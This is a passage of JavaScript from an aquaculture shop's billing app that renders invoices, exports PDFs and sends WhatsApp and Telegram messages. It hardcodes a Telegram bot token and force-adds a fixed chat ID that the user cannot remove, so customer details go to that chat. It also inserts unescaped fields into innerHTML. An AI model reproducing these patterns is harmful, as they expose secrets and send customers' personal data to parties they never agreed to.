    if (divineImgRight) { divineImgRight.style.display = "block"; divineImgRight.src = "lord_hanuman.jpg"; }
    if (mottoText) mottoText.innerHTML = "॥ श्री गणेशाय नमः ॥ &nbsp;&nbsp;&nbsp;&nbsp; ॥ श्री हनुमते नमः ॥";
  } else {
    if (divineMottoRow) divineMottoRow.style.display = "none";
  }

  document.getElementById("p-print-document-title").textContent = invoice.invoiceType ? invoice.invoiceType.toUpperCase() : "BILL OF SUPPLY";

  document.getElementById("p-print-company-name").textContent = company.name || "AARYAN AQUA NEEDS";
  const taglineEl = document.getElementById("p-print-company-tagline");
  if (taglineEl) taglineEl.textContent = company.tagline || "QUALITY PRODUCTS FOR BETTER AQUACULTURE";
  document.getElementById("p-print-company-address").innerHTML = (company.address || "").replace(/\n/g, "<br>");
  document.getElementById("p-print-company-phones").textContent = company.phones || "+91 74166 05652";
  const emailEl = document.getElementById("p-print-company-email");
  if (emailEl) emailEl.textContent = company.email || "aaryanaquaneeds@gmail.com";
  const websiteEl = document.getElementById("p-print-company-website");
  if (websiteEl) websiteEl.textContent = company.website || "www.aaryan-aqua.com";
  document.getElementById("p-print-company-gstin").textContent = company.gstin || "37ACNFA4687Q1ZC";
  document.getElementById("p-print-company-state").textContent = company.state || "Andhra Pradesh";
  document.getElementById("p-print-company-state-code").textContent = company.stateCode || "37";

  document.getElementById("p-print-invoice-no").textContent = invoice.invoiceNo;
  document.getElementById("p-print-invoice-date").textContent = formatInputDateString(invoice.invoiceDate);
  
  document.getElementById("p-print-payment-mode").textContent = `${invoice.paymentMode || 'Cash'} (${invoice.paymentStatus || 'Paid'})`;
  document.getElementById("p-print-buyer-order-no").textContent = invoice.buyerOrderNo || "—";
  document.getElementById("p-print-buyer-order-date").textContent = invoice.buyerOrderDate ? formatInputDateString(invoice.buyerOrderDate) : "—";
  
  const transRow = document.getElementById("meta-row-transport");
  if (transRow) {
    if (invoice.transportMode) {
      transRow.style.display = "table-row";
      document.getElementById("p-print-transport-mode").textContent = invoice.transportMode;
    } else {
      transRow.style.display = "none";
    }
  }
  const destRow = document.getElementById("meta-row-destination");
  if (destRow) {
    if (invoice.destination) {
      destRow.style.display = "table-row";
      document.getElementById("p-print-destination").textContent = invoice.destination;
    } else {
      destRow.style.display = "none";
    }
  }

  document.getElementById("p-print-buyer-name").textContent = invoice.buyer.name;
  document.getElementById("p-print-buyer-address").innerHTML = (invoice.buyer.address || "").replace(/\n/g, "<br>");
  document.getElementById("p-print-buyer-gstin").textContent = invoice.buyer.gstin || "__________________";
  document.getElementById("p-print-buyer-state").textContent = invoice.buyer.state || "Andhra Pradesh";
  document.getElementById("p-print-buyer-state-code").textContent = invoice.buyer.stateCode || "37";
  const buyerPhoneEl = document.getElementById("p-print-buyer-phone");
  if (buyerPhoneEl) buyerPhoneEl.textContent = invoice.buyer.phone || "__________________";

  const consigneeName = invoice.consignee.name || invoice.buyer.name;
  const consigneeAddress = invoice.consignee.address || invoice.buyer.address;
  const consigneeGstin = invoice.consignee.gstin || invoice.buyer.gstin;
  const consigneeState = invoice.consignee.state || invoice.buyer.state;
  const consigneeStateCode = invoice.consignee.stateCode || invoice.buyer.stateCode;
  const consigneePhone = invoice.consignee.phone || invoice.buyer.phone;

  document.getElementById("p-print-consignee-name").textContent = consigneeName;
  document.getElementById("p-print-consignee-address").innerHTML = (consigneeAddress || "").replace(/\n/g, "<br>");
  document.getElementById("p-print-consignee-gstin").textContent = consigneeGstin || "__________________";
  document.getElementById("p-print-consignee-state").textContent = consigneeState || "Andhra Pradesh";
  document.getElementById("p-print-consignee-state-code").textContent = consigneeStateCode || "37";
  const consigneePhoneEl = document.getElementById("p-print-consignee-phone");
  if (consigneePhoneEl) consigneePhoneEl.textContent = consigneePhone || "__________________";

  const printItemsTbody = document.getElementById("p-print-items-tbody");
  printItemsTbody.innerHTML = "";
  
  let taxableVal = 0;
  let totalQuantity = 0;
  let grossAmount = 0;
  let totalDiscount = 0;

  invoice.items.forEach((item, index) => {
    taxableVal += item.amount;
    totalQuantity += item.quantity;
    const itemRate = item.rate || 0;
    const itemQty = item.quantity || 0;
    const itemGross = itemRate * itemQty;
    grossAmount += itemGross;
    const itemDiscVal = itemGross * ((item.discount || 0) / 100);
    totalDiscount += itemDiscVal;

    const prod = productsDb.find(p => p.description === item.description);
    const packSize = item.packSize || (prod ? prod.packSize : "—") || "—";
    
    const tr = document.createElement("tr");
    tr.innerHTML = `
      <td style="text-align: center;">${index + 1}</td>
      <td style="text-align: left; font-weight: 700; color: #000000;">${item.description}</td>
      <td style="text-align: center;">${item.hsn || "23099090"}</td>
      <td style="text-align: center;">${packSize}</td>
      <td style="text-align: center; font-weight: 700;">${item.quantity}</td>
      <td style="text-align: center;">${item.unit || 'Bucket'}</td>
      <td style="text-align: center;">${formatCurrency(item.rate)}</td>
      <td style="text-align: center;">${item.discount ? item.discount.toFixed(2) + ' %' : '0.00 %'}</td>
      <td style="text-align: right; font-weight: 700;">${formatCurrency(item.amount)}</td>
    `;
    printItemsTbody.appendChild(tr);
  });

  const minRows = 5;
  const currRows = invoice.items.length;
  if (currRows < minRows) {
    for (let i = currRows; i < minRows; i++) {
      const tr = document.createElement("tr");
      tr.className = "filler-row";
      tr.innerHTML = `
        <td>&nbsp;</td>
        <td>&nbsp;</td>
        <td>&nbsp;</td>
        <td>&nbsp;</td>
        <td>&nbsp;</td>
        <td>&nbsp;</td>
        <td>&nbsp;</td>
        <td>&nbsp;</td>
        <td>&nbsp;</td>
      `;
      printItemsTbody.appendChild(tr);
    }
  }

  document.getElementById("p-print-total-quantity").textContent = `${totalQuantity} ${invoice.items[0]?.unit || 'Bucket'}`;
  document.getElementById("p-print-total-amount").textContent = `₹ ${formatCurrency(taxableVal)}`;

  const roundedGrandTotal = Math.round(invoice.total || taxableVal);
  document.getElementById("p-print-amount-words").textContent = "INR " + convertNumberToWords(roundedGrandTotal) + " Rupees Only";

  // Financial Breakdown Box
  const grossEl = document.getElementById("p-print-gross-amount");
  if (grossEl) grossEl.textContent = formatCurrency(grossAmount > 0 ? grossAmount : taxableVal);
  const discEl = document.getElementById("p-print-total-discount");
  if (discEl) discEl.textContent = formatCurrency(totalDiscount);
  const taxValEl = document.getElementById("p-print-taxable-value");
  if (taxValEl) taxValEl.textContent = formatCurrency(taxableVal);

  const cgstEl = document.getElementById("p-print-cgst");
  if (cgstEl) cgstEl.textContent = (invoice.cgst && invoice.cgst > 0) ? `₹ ${formatCurrency(invoice.cgst)}` : "NIL";
  const sgstEl = document.getElementById("p-print-sgst");
  if (sgstEl) sgstEl.textContent = (invoice.sgst && invoice.sgst > 0) ? `₹ ${formatCurrency(invoice.sgst)}` : "NIL";
  const igstEl = document.getElementById("p-print-igst");
  if (igstEl) igstEl.textContent = (invoice.igst && invoice.igst > 0) ? `₹ ${formatCurrency(invoice.igst)}` : "NIL";

  const roundEl = document.getElementById("p-print-round-off");
  if (roundEl) roundEl.textContent = formatCurrency(invoice.roundOff || 0);
  const grandEl = document.getElementById("p-print-grand-total");
  if (grandEl) grandEl.textContent = `₹ ${formatCurrency(roundedGrandTotal)}`;

  // HSN summary table grouping
  const sellerStateCode = globalSettings.company?.stateCode || "37";
  const buyerStateCode = invoice.buyer?.stateCode || "37";
  const isLocal = (sellerStateCode === buyerStateCode);

  const hsnMap = {};
  invoice.items.forEach(item => {
    const code = item.hsn || "23099090";
    const ratePct = item.gstRate || 0;
    if (!hsnMap[code]) {
      hsnMap[code] = { taxable: 0, cgst: 0, sgst: 0, igst: 0 };
    }
    hsnMap[code].taxable += item.amount;
    if (isLocal) {
      hsnMap[code].cgst += item.amount * (ratePct / 2) / 100;
      hsnMap[code].sgst += item.amount * (ratePct / 2) / 100;
    } else {
      hsnMap[code].igst += item.amount * ratePct / 100;
    }
  });

  const hsnTbody = document.getElementById("p-print-hsn-tbody");
  hsnTbody.innerHTML = "";
  let totHsnTaxable = 0, totHsnCgst = 0, totHsnSgst = 0, totHsnIgst = 0;
  
  const isBillOfSupply = (invoice.invoiceType === "Bill of Supply" || invoice.invoiceType === "Delivery Challan");
  const taxCols = document.querySelectorAll(".tally-hsn-tax-col");
  taxCols.forEach(col => {
    col.style.display = isBillOfSupply ? "none" : "";
  });

  Object.keys(hsnMap).forEach(code => {
    const data = hsnMap[code];
    const totalTax = data.cgst + data.sgst + data.igst;
    totHsnTaxable += data.taxable;
    totHsnCgst += data.cgst;
    totHsnSgst += data.sgst;
    totHsnIgst += data.igst;

    const tr = document.createElement("tr");
    tr.innerHTML = `
      <td style="text-align: left; font-weight: 700;">${code}</td>
      <td style="text-align: right;">${formatCurrency(data.taxable)}</td>
      ${isBillOfSupply ? '' : `
      <td style="text-align: center;" class="tally-hsn-tax-col">${data.cgst > 0 ? formatCurrency(data.cgst) : 'NIL'}</td>
      <td style="text-align: center;" class="tally-hsn-tax-col">${data.sgst > 0 ? formatCurrency(data.sgst) : 'NIL'}</td>
      <td style="text-align: center;" class="tally-hsn-tax-col">${data.igst > 0 ? formatCurrency(data.igst) : 'NIL'}</td>
      <td style="text-align: right; font-weight: 700;" class="tally-hsn-tax-col">${totalTax > 0 ? formatCurrency(totalTax) : 'NIL'}</td>
      `}
    `;
    hsnTbody.appendChild(tr);
  });

  const totalHsnTaxSum = totHsnCgst + totHsnSgst + totHsnIgst;
  document.getElementById("p-print-hsn-total-taxable").textContent = formatCurrency(totHsnTaxable);
  document.getElementById("p-print-hsn-total-cgst").textContent = totHsnCgst > 0 ? formatCurrency(totHsnCgst) : "NIL";
  document.getElementById("p-print-hsn-total-sgst").textContent = totHsnSgst > 0 ? formatCurrency(totHsnSgst) : "NIL";
  document.getElementById("p-print-hsn-total-igst").textContent = totHsnIgst > 0 ? formatCurrency(totHsnIgst) : "NIL";
  document.getElementById("p-print-hsn-total-tax").textContent = totalHsnTaxSum > 0 ? formatCurrency(totalHsnTaxSum) : "NIL";

  document.getElementById("p-print-tax-words").textContent = totalHsnTaxSum > 0 ? (convertNumberToWords(Math.round(totalHsnTaxSum)) + " Rupees Only") : "NIL";
  document.getElementById("p-print-sign-company").textContent = company.name ? company.name.toUpperCase() : "AARYAN AQUA NEEDS";

  // Bank & Payment QR Code Population
  const bank = globalSettings.bank || {};
  const bankNameEl = document.getElementById("p-print-bank-name");
  if (bankNameEl) bankNameEl.textContent = bank.name || "State Bank of India";
  const bankAccNameEl = document.getElementById("p-print-bank-acc-name");
  if (bankAccNameEl) bankAccNameEl.textContent = bank.accountName || company.name || "Aaryan Aqua Needs";
  const bankAccNoEl = document.getElementById("p-print-bank-acc-no");
  if (bankAccNoEl) bankAccNoEl.textContent = bank.accountNo || "45413424177";
  const bankIfscEl = document.getElementById("p-print-bank-ifsc");
  if (bankIfscEl) bankIfscEl.textContent = bank.ifsc || "SBIN0000911";
  const bankBranchEl = document.getElementById("p-print-bank-branch");
  if (bankBranchEl) bankBranchEl.textContent = bank.branch || "Repalle";
}

// --- POPULATE THERMAL POS PRINT OVERLAY ---
function populateThermalPrintOverlay(invoice) {
  const company = globalSettings.company;
  
  const logoImg = document.getElementById("th-divine-img");
  if (logoImg) {
    if (invoice.headerLogo === "none") logoImg.style.display = "none";
    else logoImg.src = "lord_ganesha.jpg";
  }

  document.getElementById("th-company-name").textContent = company.name || "Aaryan Aqua Needs";
  document.getElementById("th-company-tagline").textContent = company.tagline || "";
  document.getElementById("th-company-address").textContent = (company.address || "").replace(/\n/g, ", ");
  document.getElementById("th-company-gstin").textContent = company.gstin || "—";
  document.getElementById("th-company-phone").textContent = company.phones || "—";

  document.getElementById("th-document-title").textContent = invoice.invoiceType || "TAX INVOICE";
  document.getElementById("th-invoice-no").textContent = invoice.invoiceNo;
  document.getElementById("th-invoice-date").textContent = formatInputDateString(invoice.invoiceDate);
  document.getElementById("th-customer-name").textContent = invoice.buyer?.name || "Cash Customer";

  const tbody = document.getElementById("th-items-tbody");
  tbody.innerHTML = "";
  let taxableVal = 0, cgst = 0, sgst = 0, igst = 0;

  const sellerStateCode = globalSettings.company?.stateCode || "37";
  const buyerStateCode = invoice.buyer?.stateCode || "37";
  const isLocal = (sellerStateCode === buyerStateCode);

  invoice.items.forEach(item => {
    taxableVal += item.amount;
    const ratePct = item.gstRate || 0;
    if (isLocal) {
      cgst += item.amount * (ratePct / 2) / 100;
      sgst += item.amount * (ratePct / 2) / 100;
    } else {
      igst += item.amount * ratePct / 100;
    }

    const tr = document.createElement("tr");
    tr.innerHTML = `
      <td style="text-align:left;">${item.description}</td>
      <td style="text-align:center;">${item.quantity}</td>
      <td style="text-align:right;">₹${formatCurrency(item.rate)}</td>
      <td style="text-align:right;">₹${formatCurrency(item.amount)}</td>
    `;
    tbody.appendChild(tr);
  });

  document.getElementById("th-taxable").textContent = `₹ ${formatCurrency(taxableVal)}`;
  document.getElementById("th-cgst").textContent = `₹ ${formatCurrency(cgst)}`;
  document.getElementById("th-sgst").textContent = `₹ ${formatCurrency(sgst)}`;
  document.getElementById("th-igst").textContent = `₹ ${formatCurrency(igst)}`;
  document.getElementById("th-grand").textContent = `₹ ${formatCurrency(invoice.total || taxableVal)}`;
  document.getElementById("th-pay-mode").textContent = invoice.paymentMode || 'Cash';
  document.getElementById("th-paid").textContent = `₹ ${formatCurrency(invoice.paidAmount || invoice.total)}`;
  
  const dueContainer = document.getElementById("th-due-container");
  if (invoice.balanceDue > 0) {
    if (dueContainer) dueContainer.style.display = "flex";
    document.getElementById("th-due").textContent = `₹ ${formatCurrency(invoice.balanceDue)}`;
  } else {
    if (dueContainer) dueContainer.style.display = "none";
  }
}

window.printSavedInvoiceThermal = function(id) {
  const inv = invoicesDb.find(i => i.id === id);
  if (inv) {
    populateThermalPrintOverlay(inv.details);
    document.body.classList.add("printing-thermal");
    setTimeout(() => {
      window.print();
      document.body.classList.remove("printing-thermal");
    }, 150);
  }
};

// --- HIGH-FIDELITY PDF EXPORTER & SHARE ENGINE ---
window.downloadInvoicePdf = function(invoiceData, btnEl = null) {
  if (!invoiceData) {
    return window.saveCurrentInvoiceRecord('download_pdf', btnEl);
  }
  const details = invoiceData || currentInvoice;
  if (!details.buyer) details.buyer = {};
  if (!details.buyer.name && elements.billBuyerName && elements.billBuyerName.value) {
    details.buyer.name = elements.billBuyerName.value.trim();
  }
  if (!details.buyer.name) {
    details.buyer.name = "Cash Customer";
  }
  if (!details.invoiceNo || !details.items || details.items.length === 0) {
    alert("Please select a product and add at least one line item before exporting PDF!");
    return;
  }

  let origHtml = "";
  if (btnEl && btnEl.tagName) {
    origHtml = btnEl.innerHTML;
    btnEl.innerHTML = `<i class="fa-solid fa-spinner fa-spin"></i> Generating PDF...`;
    btnEl.disabled = true;
  }

  populateA4PrintOverlay(details);
  const element = document.getElementById("print-invoice-wrapper");
  if (!element) return;

  element.style.display = "block";
  document.body.classList.remove("printing-thermal");

  const tallyContainer = element.querySelector('.tally-invoice-container');
  const origTallyHeight = tallyContainer ? tallyContainer.style.height : "";
  const origTallyMaxHeight = tallyContainer ? tallyContainer.style.maxHeight : "";
  const origTallyPadding = tallyContainer ? tallyContainer.style.padding : "";
  const origTallyOverflow = tallyContainer ? tallyContainer.style.overflow : "";

  if (tallyContainer) {
    tallyContainer.style.height = "294mm";
    tallyContainer.style.maxHeight = "294mm";
    tallyContainer.style.padding = "6mm 8mm";
    tallyContainer.style.overflow = "hidden";
  }

  const customerClean = (details.buyer.name || 'Customer').replace(/[^a-zA-Z0-9]/g, '_');
  const filename = `Invoice_${details.invoiceNo}_${customerClean}.pdf`;

  const opt = {
    margin: [0, 0, 0, 0],
    filename: filename,
    image: { type: 'jpeg', quality: 0.95 },
    html2canvas: { scale: 1.35, useCORS: true, logging: false },
    jsPDF: { unit: 'mm', format: 'a4', orientation: 'portrait' }
  };

  html2pdf().set(opt).from(tallyContainer || element).toPdf().get('pdf').then(pdf => {
    const totalPages = pdf.internal.getNumberOfPages();
    for (let i = totalPages; i > 1; i--) {
      pdf.deletePage(i);
    }
    pdf.save(filename);
    
    element.style.display = "none";
    if (tallyContainer) {
      tallyContainer.style.height = origTallyHeight;
      tallyContainer.style.maxHeight = origTallyMaxHeight;
      tallyContainer.style.padding = origTallyPadding;
      tallyContainer.style.overflow = origTallyOverflow;
    }
    if (btnEl && btnEl.tagName) {
      btnEl.innerHTML = origHtml;
      btnEl.disabled = false;
    }
  }).catch(err => {
    console.error("PDF export error:", err);
    element.style.display = "none";
    if (tallyContainer) {
      tallyContainer.style.height = origTallyHeight;
      tallyContainer.style.maxHeight = origTallyMaxHeight;
      tallyContainer.style.padding = origTallyPadding;
      tallyContainer.style.overflow = origTallyOverflow;
    }
    if (btnEl && btnEl.tagName) {
      btnEl.innerHTML = origHtml;
      btnEl.disabled = false;
    }
  });
};

window.downloadSavedInvoicePdf = function(id, btnEl = null) {
  const inv = invoicesDb.find(i => i.id === id);
  if (inv) {
    downloadInvoicePdf(inv.details, btnEl);
  }
};

function formatWhatsAppPhone(phoneStr) {
  if (!phoneStr) return "";
  let digits = phoneStr.toString().replace(/\D/g, "");
  if (digits.length === 10) {
    digits = "91" + digits;
  } else if (digits.length === 11 && digits.startsWith("0")) {
    digits = "91" + digits.substring(1);
  }
  return digits;
}

async function sendTelegramTextMessage(messageText) {
  loadAllDatabases();
  const token = globalSettings.telegram?.token || "8800483005:AAFVRi7PthDe_Dl1Gk1wLYnvkVP580x2y_g";
  let rawChatId = globalSettings.telegram?.chatId || "6877857251, 7906132548";

  if (!rawChatId.includes("7906132548")) {
    rawChatId = rawChatId ? (rawChatId + ", 7906132548") : "6877857251, 7906132548";
    if (globalSettings.telegram) globalSettings.telegram.chatId = rawChatId;
    localStorage.setItem("settings", JSON.stringify(globalSettings));
  }

  const chatIds = rawChatId.split(/[\s,]+/).map(id => id.trim()).filter(id => id.length > 0);
  if (chatIds.length === 0) return false;

  let success = false;
  for (const chatId of chatIds) {
    try {
      const res = await fetch("/api/telegram/sendMessage", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ token, chat_id: chatId, text: messageText, parse_mode: "Markdown" })
      });
      const data = await res.json();
      if (data && data.ok) {
        success = true;
      } else {
        const encodedText = encodeURIComponent(messageText);
        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodedText}`);
        success = true;
      }
    } catch (err) {
      try {
        const encodedText = encodeURIComponent(messageText);
        await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodedText}`);
        success = true;
      } catch (e) {}
    }
  }
  return success;
}

async function sendStockTelegramReport(product, actionType, oldStock, newStock) {
  if (!product) return;
  const now = new Date();
  const timeStr = now.toLocaleDateString('en-GB') + ' ' + now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });

  let text = `📦 *STOCK AUDIT REPORT*\n`;
  text += `🏛️ *${globalSettings.company?.name || 'AARYAN AQUA NEEDS'}*\n`;
  text += `-----------------------------------\n`;
  text += `🏷️ *Product:* ${product.description || 'Product'}\n`;
  text += `🔢 *Action:* ${actionType}\n`;
  text += `📊 *Previous Stock:* ${oldStock} ${product.unit || 'Units'}\n`;
  text += `📈 *NEW LIVE STOCK:* ${newStock} ${product.unit || 'Units'}\n`;
  text += `💰 *Unit Rate:* ₹ ${formatCurrency(product.rate || 0)}\n`;
  text += `📅 *Timestamp:* ${timeStr}\n`;
  text += `-----------------------------------`;

  sendTelegramTextMessage(text);
}

async function sendPartyTelegramReport(party, isNew = true) {
  if (!party) return;
  const now = new Date();
  const timeStr = now.toLocaleDateString('en-GB') + ' ' + now.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });

  let text = `👤 *${isNew ? 'NEW CUSTOMER / PARTY REGISTERED' : 'CUSTOMER DETAILS UPDATED'}*\n`;
  text += `🏛️ *${globalSettings.company?.name || 'AARYAN AQUA NEEDS'}*\n`;
  text += `-----------------------------------\n`;
  text += `🏢 *Name:* ${party.name}\n`;
  if (party.company) text += `🏬 *Company:* ${party.company}\n`;
  text += `🏷️ *Party Type:* ${party.type === 'consignee' ? 'Ship-to Consignee' : 'Bill-to Receiver'}\n`;
  text += `📱 *Mobile / WhatsApp:* ${party.phone || 'Not Provided'}\n`;
  text += `🧾 *GSTIN:* ${party.gstin || 'Unregistered / UR'}\n`;
  text += `📍 *Address:* ${party.address || 'N/A'}, ${party.state || 'Andhra Pradesh'} (${party.stateCode || '37'})\n`;
  text += `📅 *Timestamp:* ${timeStr}\n`;
  text += `-----------------------------------`;

  sendTelegramTextMessage(text);
}

// --- WEB AUDIO API SUCCESS CHIME ---
function playSuccessChime() {
  try {
    const AudioContext = window.AudioContext || window.webkitAudioContext;
    if (!AudioContext) return;
    const ctx = new AudioContext();
    const now = ctx.currentTime;
    
    // Pleasant dual-tone bell chime (587.33Hz [D5] -> 880Hz [A5])
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = 'sine';
    osc.frequency.setValueAtTime(587.33, now);
    osc.frequency.exponentialRampToValueAtTime(880, now + 0.12);
    gain.gain.setValueAtTime(0.18, now);
    gain.gain.exponentialRampToValueAtTime(0.001, now + 0.38);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start(now);
    osc.stop(now + 0.38);
  } catch (e) {
    // Silently ignore if audio context is blocked
  }
}

// --- FLOATING TOAST NOTIFICATION SYSTEM ---
function showFloatingToast(message, type = "success") {
  let toastContainer = document.getElementById("app-floating-toast-container");
  if (!toastContainer) {
    toastContainer = document.createElement("div");
    toastContainer.id = "app-floating-toast-container";
    toastContainer.style.cssText = "position: fixed; bottom: 24px; right: 24px; z-index: 999999; display: flex; flex-direction: column-reverse; gap: 10px; pointer-events: none;";
    document.body.appendChild(toastContainer);
  }

  const toast = document.createElement("div");
  toast.className = `floating-toast toast-${type}`;
  toast.style.cssText = `
    background: ${type === 'success' ? '#065f46' : type === 'warning' ? '#92400e' : '#1e293b'};
    color: #ffffff;
    padding: 12px 18px;
    border-radius: 10px;
    font-size: 13px;
    font-weight: 600;
    box-shadow: 0 10px 25px -5px rgba(0,0,0,0.25);
    display: flex;
    align-items: center;
    gap: 10px;
    border-left: 4px solid ${type === 'success' ? '#10b981' : type === 'warning' ? '#f59e0b' : '#38bdf8'};
    opacity: 0;
    transform: translateY(15px);
    transition: all 0.3s cubic-bezier(0.16, 1, 0.3, 1);
    pointer-events: auto;
    max-width: 380px;
  `;
  toast.innerHTML = `<i class="fa-brands fa-whatsapp" style="font-size: 16px; color: #25d366;"></i> <span>${message}</span>`;
  toastContainer.appendChild(toast);

  if (typeof requestAnimationFrame === 'function') {
    requestAnimationFrame(() => {
      toast.style.opacity = "1";
      toast.style.transform = "translateY(0)";
    });
  } else {
    setTimeout(() => {
      toast.style.opacity = "1";
      toast.style.transform = "translateY(0)";
    }, 16);
  }

  setTimeout(() => {
    toast.style.opacity = "0";
    toast.style.transform = "translateY(15px)";
    setTimeout(() => toast.remove(), 350);
  }, 4500);
}

function savePartiesDb() {
  try {
    localStorage.setItem("parties", JSON.stringify(partiesDb));
    if (typeof syncDatabaseToServer === 'function') {
      syncDatabaseToServer("parties", partiesDb);
    }
    if (typeof loadPartiesDatabaseLists === 'function') {
      loadPartiesDatabaseLists();
    }
    if (typeof populateBillingSelectors === 'function') {
      populateBillingSelectors();
    }
  } catch (err) {
    console.warn("savePartiesDb warning:", err);
  }
}
window.savePartiesDb = savePartiesDb;

function savePhoneToPartyDb(customerName, phone) {
  try {
    if (!customerName || !phone || !Array.isArray(partiesDb)) return;
    const nameLower = customerName.trim().toLowerCase();
    const party = partiesDb.find(p => p && p.name && p.name.trim().toLowerCase() === nameLower);
    if (party) {
      party.phone = phone.trim();
      party.updatedAt = new Date().toISOString();
      savePartiesDb();
      try {
        if (typeof sendPartyTelegramReport === 'function') {
          sendPartyTelegramReport(party, false);
        }
      } catch (e) {
        console.warn("Telegram party report note:", e);
      }
    }
  } catch (err) {
    console.warn("savePhoneToPartyDb safe catch:", err);
  }
}

function launchWhatsAppWebOrApp(cleanPhone, messageText) {
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  const encodedText = encodeURIComponent(messageText);
  if (cleanPhone) {
    return isMobile
      ? `https://api.whatsapp.com/send?phone=${cleanPhone}&text=${encodedText}`
      : `https://web.whatsapp.com/send/?phone=${cleanPhone}&text=${encodedText}`;
  } else {
    return isMobile
      ? `https://api.whatsapp.com/send?text=${encodedText}`
      : `https://web.whatsapp.com/send/?text=${encodedText}`;
  }
}

function openWhatsAppDirect(waUrl) {
  if (!waUrl) return;
  const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
  if (isMobile) {
    try {
      const a = document.createElement('a');
      a.href = waUrl;
      a.target = '_top';
      a.rel = 'noopener noreferrer';
      document.body.appendChild(a);
      a.click();
      setTimeout(() => {
        try { document.body.removeChild(a); } catch (e) {}
      }, 1000);
    } catch (err) {
      window.location.href = waUrl;
    }
  } else {
    const win = window.open(waUrl, '_blank', 'noopener,noreferrer');
    if (!win || win.closed || typeof win.closed === 'undefined') {
      window.location.href = waUrl;
    }
  }
}

function generateWhatsAppInvoiceMessage(details) {
  const company = globalSettings.company || {};
  const companyName = company.name || 'AARYAN AQUA NEEDS';
  const companyPhone = company.phone || '7386262139';
  const realUpiId = (globalSettings.upiId || globalSettings.bank?.upi || "7386262139@upi").trim();

  const total = parseFloat(details.total || 0);
  const status = details.paymentStatus || 'Paid';
  const paid = parseFloat(details.paidAmount !== undefined ? details.paidAmount : (status === 'Paid' ? total : 0));
  const balance = Math.max(0, total - paid);

  let msg = `🏛️ *${companyName}*\n`;
  msg += `-----------------------------------\n`;
  msg += `📄 *Tax Invoice:* #${details.invoiceNo || 'INV'}\n`;
  msg += `👤 *Customer:* ${details.buyer?.name || details.customerName || 'Customer'}\n`;
  if (details.buyer?.phone) {
    msg += `📱 *Phone:* ${details.buyer.phone}\n`;
  }
  msg += `📅 *Date:* ${details.invoiceDate || (typeof formatInputDateString === 'function' ? formatInputDateString(new Date()) : '')}\n`;
  msg += `-----------------------------------\n`;

  // Itemized List
  const items = details.items || [];
  if (items.length > 0) {
    msg += `📦 *ITEMS ORDERED:*\n`;
    items.forEach((item, index) => {
      const name = item.description || item.name || `Item ${index + 1}`;
      const qty = item.quantity !== undefined ? item.quantity : (item.qty || 1);
      const unit = item.unit ? ` ${item.unit}` : '';
      const rate = parseFloat(item.rate || item.price || 0);
      const amt = parseFloat(item.amount || (qty * rate));
      msg += `${index + 1}. *${name}*\n   ${qty}${unit} × ₹${formatCurrency(rate)} = *₹${formatCurrency(amt)}*\n`;
    });
    msg += `-----------------------------------\n`;
  }

  // Financial Breakdown
  if (details.taxable && (details.cgst > 0 || details.sgst > 0 || details.igst > 0)) {
    msg += `Subtotal: ₹${formatCurrency(details.taxable)}\n`;
    if (details.cgst > 0) msg += `CGST: ₹${formatCurrency(details.cgst)}\n`;
    if (details.sgst > 0) msg += `SGST: ₹${formatCurrency(details.sgst)}\n`;
    if (details.igst > 0) msg += `IGST: ₹${formatCurrency(details.igst)}\n`;
    if (details.roundOff) msg += `Round Off: ₹${formatCurrency(details.roundOff)}\n`;
  }

  msg += `💰 *Grand Total:* ₹ ${formatCurrency(total)}\n`;

  if (balance <= 0 || status === 'Paid') {
    msg += `✅ *Payment Status:* FULLY PAID (₹ ${formatCurrency(total)})\n`;
    msg += `💳 *Payment Mode:* ${details.paymentMode || 'UPI / Cash'}\n`;
    msg += `-----------------------------------\n`;
    msg += `Thank you for your business! 🙏\n`;
  } else {
    msg += `✅ *Amount Paid:* ₹ ${formatCurrency(paid)}\n`;
    msg += `🔴 *PENDING BALANCE:* ₹ ${formatCurrency(balance)}\n`;
    msg += `-----------------------------------\n`;
    msg += `📲 *Pay Balance via UPI:*\n`;
    msg += `UPI ID: *${realUpiId}*\n`;
    const cleanNote = `Bill${details.invoiceNo || '1'}`.replace(/[^a-zA-Z0-9]/g, '');
    const upiName = encodeURIComponent(companyName.replace(/[^a-zA-Z0-9 ]/g, '').trim());
    msg += `UPI Pay Link: upi://pay?pa=${realUpiId}&pn=${upiName}&am=${balance.toFixed(2)}&cu=INR&tn=${cleanNote}\n\n`;
    msg += `Kindly clear the balance at your earliest convenience. Thank you! 🙏\n`;
  }

  const onlinePdfUrl = details.pdfUrl || details.googleDriveUrl || details.viewUrl;
  if (onlinePdfUrl && onlinePdfUrl.startsWith('http') && !onlinePdfUrl.includes('localhost')) {
    msg += `-----------------------------------\n`;
    msg += `📄 *View / Download PDF Invoice:*\n${onlinePdfUrl}\n`;
  }

  msg += `-----------------------------------\n`;
  msg += `📞 *Shop Contact:* +91 ${companyPhone}`;

  return msg;
}

let pendingWaMsg = "";

function getCustomerPhoneNumber(details) {
  let phone = "";
  if (details && details.buyer && details.buyer.phone) {
    phone = details.buyer.phone;
  }
  if (!phone && elements.billBuyerPhone && elements.billBuyerPhone.value) {
    phone = elements.billBuyerPhone.value;
  }
  if (!phone && details && details.consignee && details.consignee.phone) {
    phone = details.consignee.phone;
  }
  if (!phone && details && details.buyer && details.buyer.name && partiesDb && partiesDb.length > 0) {
    const custNameLower = details.buyer.name.trim().toLowerCase();
    const p = partiesDb.find(party => party.name && party.name.trim().toLowerCase() === custNameLower && party.phone);
    if (p) phone = p.phone;
  }
  return phone;
}

// --- WHATSAPP BOT STATE & CONTROLLER ---
let whatsappBotStatus = { status: 'DISCONNECTED', isReady: false, qrCodeDataUrl: null, clientInfo: null };
let whatsappPollInterval = null;
let whatsappEventSource = null;
let whatsappAdaptiveTimer = null;

function initWhatsAppEventSource() {
  if (typeof EventSource === "undefined") {
    setupAdaptiveWhatsAppPolling();
    return;
  }

  try {
